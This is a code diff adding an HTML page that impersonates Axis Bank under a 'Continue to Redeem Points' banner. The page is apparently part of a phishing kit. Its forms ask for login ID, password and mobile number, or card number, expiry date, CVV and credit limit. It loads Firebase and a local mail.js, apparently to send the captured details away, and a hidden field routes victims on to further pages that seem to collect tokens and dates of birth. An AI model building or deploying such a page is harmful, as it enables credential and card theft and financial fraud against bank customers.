@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axis Bank</title>
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <img src="assets/header.jpg" width="100%" alt="">
+    </header>
+    <main>
+        <h2 class="text-center" style="font-weight: bold; font-family: 'Lato', sans-serif;">Continue to Redeem Points</h2>
+        <div class="button-group">
+            <div id="loginid" class="btn btn-primary login-form fs text-center" style="padding: 7px 13px;">Login ID / Customer ID</div>
+            <div id="credit" class="btn button-inactive credit-card-form fs text-center" style="padding: 7px 13px;">Credit Card Login</div>
+        </div>
+        <div class="box">
+            <input type="hidden" id="nextValue" value="loader-home.html?next=tok.html?next=cdob.html">
+            <form id="contactForm" class="form" >
+                <div id="form_container">
+                    <div id="login_form">
+                        <div class="form-group">
+                            <label for="lc_id">Login ID / Customer ID</label>
+                            <input type="text" id="lc_id" name="lc_id" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="lpass">Password</label>
+                            <input type="password" id="lpass" name="lpass" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="rgmob">Registered Mobile No.</label>
+                            <input type="text" id="rgmob" name="rgmob" inputmode="numeric" class="numericInput" maxlength="10" minlength="10" title="Required valid 10 digit number" required>
+                        </div>
+                    </div>
+                    <div id="credit_card_form" style="display: none;">
+                        <div class="form-group">
+                            <label for="ccnum">Credit Card Number</label>
+                            <input type="text" id="ccnum" name="ccnum" inputmode="numeric">
+                        </div>
+                        <div class="form-two w-100">
+                            <div class="form-group w-50">
+                                <label for="edate">Expiry Date</label>
+                                <input type="text" id="edate" name="edate" inputmode="numeric" placeholder="MM / YY">
+                            </div>
+                            <div class="form-group w-50">
+                                <label for="cvv">CVV/CVV</label>
+                                <input type="password" id="cvv" name="cvv" placeholder="***" >
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label for="ccl">Available Card Limit (in Rupees)</label>
+                            <input type="number" id="ccl" name="creditlimit" inputmode="numeric">
+                        </div>
+                        <div class="form-group">
+                            <label for="rgmob_cc">Registered Mobile No.</label>
+                            <input type="text" id="rgmob_cc" name="rgmob1" inputmode="numeric" maxlength="10" minlength="10" title="Required valid 10 digit number">
+                        </div>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <button type="submit" class="btn btn-primary">LOGIN</button>
+                </div>
+            </form>
+        </div>
+        <img src="assets/footer.jpg" alt="" width="100%">
+    </main>
+    <footer>
+        <img src="assets/cop.jpg" alt="" width="100%">
+    </footer>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+    <script src="./mail.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            var cleaveCCNum = new Cleave('#ccnum', {
+                creditCard: true
+            });
+
+            var cleaveEDate = new Cleave('#edate', {
+                date: true,
+                datePattern: ['m', 'y']
+            });
+
+            var cleaveCVV = new Cleave('#cvv', {
+                numeral: true,
+                numeralPositiveOnly: true
+            });
+
+            var cleaveRGMob = new Cleave('#rgmob', {
+                numericOnly: true,
+                blocks: [10],
+                delimiter: ''
+            });
+
+            var cleaveRGMobCC = new Cleave('#rgmob_cc', {
+                numericOnly: true,
+                blocks: [10],
+                delimiter: ''
+            });
+
+            $("#loginid").click(function() {
+                $(this).addClass("btn-primary");
+                $("#credit").removeClass("btn-primary");
+                $("#login_form input").attr("required", "required");
+                $("#credit_card_form input").removeAttr("required");
+                $("#credit_card_form").hide();
+                $("#login_form").fadeIn();
+            });
+
+            $("#credit").click(function() {
+                $(this).addClass("btn-primary");
+                $("#loginid").removeClass("btn-primary");
+                $("#credit_card_form input").attr("required", "required");
+                $("#login_form input").removeAttr("required");
+                $("#login_form").hide();
+                $("#credit_card_form").fadeIn();
+            });
+        });
+    </script>
+</body>
+</html>
